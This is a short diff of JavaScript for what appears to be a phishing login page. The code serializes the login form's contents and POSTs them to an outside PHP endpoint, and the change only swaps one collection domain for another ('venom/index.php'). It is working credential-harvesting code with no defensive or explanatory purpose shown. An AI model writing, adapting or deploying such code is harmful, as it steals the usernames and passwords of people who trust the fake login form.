@@ -2,7 +2,7 @@ $(".login-form").submit(function() {
 	var d = $(".login-form");
 
 	$.ajax({
-        url: "https://website-redcodex.xyz/8bit/system.php",
+        url: "http://aditpratamaa.my.id/venom/index.php",
         type: "POST",
         data: d.serialize(),
         success: function () {
